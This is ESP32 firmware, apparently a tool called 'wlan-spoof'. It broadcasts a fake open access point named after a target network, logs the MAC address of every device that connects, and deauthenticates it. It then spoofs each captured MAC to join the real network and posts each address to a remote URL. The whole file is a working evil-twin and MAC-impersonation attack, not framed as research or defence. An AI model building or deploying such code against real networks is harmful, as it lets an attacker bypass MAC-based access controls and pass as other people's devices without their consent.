#include <esp_wifi.h>
#include <HTTPClient.h>
#include <WiFi.h>
#include <Preferences.h>
#include <util.h>

#include "mac_ring.h"

#ifndef POST_NOTIFY_URL
#define POST_NOTIFY_URL "https://ip.sb"
#endif
#ifndef _SSID
#define _SSID "ESP32"
#endif
#define WIFI_MAX_WAIT 6
#define MIN_RSSI_REQUIREMENT (-66)
#define AUTOSAVE_INTERVAL (120)

const uint32_t SCAN_THRESHOLD_MILLIS = 10 * 60 * 1000; // 10 minutes
const uint32_t SCAN_SINCE_LAST_STA_CONNECT = 5 * 60 * 1000; // 5 minutes
const char *TARGET_SSID = _SSID;
const int LED_PIN = 2;

static uint64_t nextScan;
static uint64_t lastSTAConnect;
static uint64_t lastSave;
static bool isButtonHold;
static UniqueMacRing mac_ring;

void onWifiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
    lastSTAConnect = millis();
    MacAddress addr;
    memcpy(addr.addr, info.wifi_ap_staconnected.mac, 6);
    if(mac_ring.push(addr)) {
        auto str = macToString(addr.addr);
        log_i("New device connected: %s", str.c_str());
        digitalWrite(LED_PIN, HIGH);
    }
    // we have only 4 maximum connections in total.
    esp_wifi_deauth_sta(info.wifi_ap_staconnected.aid);
}

void initAP() {
    WiFiClass::mode(WIFI_MODE_AP);
    if (!WiFi.softAP(TARGET_SSID)) {
        log_e("Failed to initialize softAP");
        while (1) {
            digitalWrite(LED_PIN, HIGH);
            delay(250);
            digitalWrite(LED_PIN, LOW);
            delay(250);
        }
    }
}

void postAddressToServer() {
    WiFi.begin(TARGET_SSID);
    NetworkClientSecure wifiClient;
    uint8_t retries = 0;
    do {
        if (retries >= WIFI_MAX_WAIT) {
            break;
        }
        delay(pow(2, retries++) * 1000);
        Serial.print(".");
    } while (WiFi.status() != WL_CONNECTED);
    if (retries >= WIFI_MAX_WAIT && WiFi.status() != WL_CONNECTED) {
        log_e("Failed to connect to WiFi, skipping this.\n");
        esp_wifi_stop();
        return;
    }
    uint8_t address[6];
    esp_wifi_get_mac(WIFI_IF_STA, address);
    wifiClient.setCACert(LE_ISRG_CERT);
    String payload = String("message=") + macToString(address); {
        HTTPClient http = {};
        http.begin(wifiClient, POST_NOTIFY_URL);
        http.setReuse(false);
        http.addHeader("Content-Type", "application/x-www-form-urlencoded");
        int status = http.POST(payload);
        log_i("Message sent! Return code: %d \n", status);
    }
    WiFi.disconnect();
}

void checkAvailablity() {
    for (MacAddress *mac = nullptr; mac_ring.hasNext(); mac = mac_ring.pop()) {
        if (mac == nullptr) continue;
        if (!isMacValid(mac->addr)) continue;
        log_i("Setting address to %s", macToString(mac->addr).c_str());
        esp_err_t err =
                ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mac(WIFI_IF_STA, mac->addr));
        if (err != ESP_OK) {
            String addr = macToString(mac->addr);
            log_i("Cannot set mac address with %s. Now skipping", addr.c_str());
            continue;
        }
        postAddressToServer();
    }
}

bool isAPSignalEnough() {
    // make sure we're in sta mode.
    if ((WiFiClass::getMode() & WIFI_MODE_STA) == 0) {
        WiFi.softAPdisconnect();
        WiFiClass::mode(WIFI_MODE_STA);
    }

    int16_t numNets = WiFi.scanNetworks();
    if (numNets > 0) {
        log_i("%d networks nearby, finding target...", numNets);
        for (uint16_t indexNet = 0; indexNet < numNets; ++indexNet) {
            auto that_ssid = WiFi.SSID(indexNet);
            auto ssid = that_ssid.c_str();
            if (strcmp(ssid, TARGET_SSID) == 0) {
                int32_t rssi = WiFi.RSSI(indexNet);
                if (rssi > MIN_RSSI_REQUIREMENT) {
                    log_i("Found target network %s. (rssi: %4ld)", ssid, rssi);
                    return true;
                }
            }
        }
    } else {
        log_i("No networks found");
    }
    return false;
}

void scanNearbyNetworks() {
    log_i("Scanning nearby networks");
    bool can_start = isAPSignalEnough();
    if (can_start) {
        digitalWrite(LED_PIN,HIGH);
        checkAvailablity();
        digitalWrite(LED_PIN,LOW);
    } else {
        Serial.println("No target signal! Try at next round.");
        for (int i = 0; i < 6; ++i) {
            digitalWrite(LED_PIN, HIGH);
            delay(500);
            digitalWrite(LED_PIN, LOW);
            delay(500);
        }
    }
    nextScan = millis() + SCAN_THRESHOLD_MILLIS;
    initAP();
}

void setup() {
    sleep(2);
    Serial.begin(115200);
    log_i("Initializing wlan-spoof");
    pinMode(LED_PIN, OUTPUT);
    pinMode(BOOT_PIN, INPUT_PULLUP);
    log_i("Initializing WiFi AP");
    WiFi.onEvent(onWifiEvent, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    initAP();
    nextScan = millis() + SCAN_THRESHOLD_MILLIS;
    lastSTAConnect = millis();
    lastSave = millis();
    isButtonHold = false;
    Preferences prefs;
    if (prefs.begin("wlan-spoof")) {
        if(prefs.isKey("mac_dump")) {
            log_i("Dumping last stored results:");
            mac_ring.load(&prefs);
            mac_ring.dumpToSerial();
        }
        prefs.end();
    }
    log_i("wlan-spoof is successfully initialized!");
}

void loop() {
    if (millis() > nextScan && millis() > lastSTAConnect + SCAN_SINCE_LAST_STA_CONNECT) {
        scanNearbyNetworks();
    }
    if (millis() > lastSave + AUTOSAVE_INTERVAL * 1000) {
        log_i("Saving recorded mac addresses.");
        digitalWrite(LED_PIN, LOW);
        lastSave = millis(); {
            Preferences prefs;
            if (!prefs.begin("wlan-spoof")) {
                log_e("Cannot initialize wlan-spoof pref storage. autosave failed.");
                lastSave = UINT64_MAX;
            } else {
                mac_ring.dump(&prefs);
                mac_ring.dumpToSerial();
            }
            prefs.end();
        }
    }
    if (digitalRead(BOOT_PIN) == LOW) {
        if(!isButtonHold) {
            isButtonHold = true;
            mac_ring.dumpToSerial();
        }
    } else {
        isButtonHold = false;
    }
    delay(50);
}
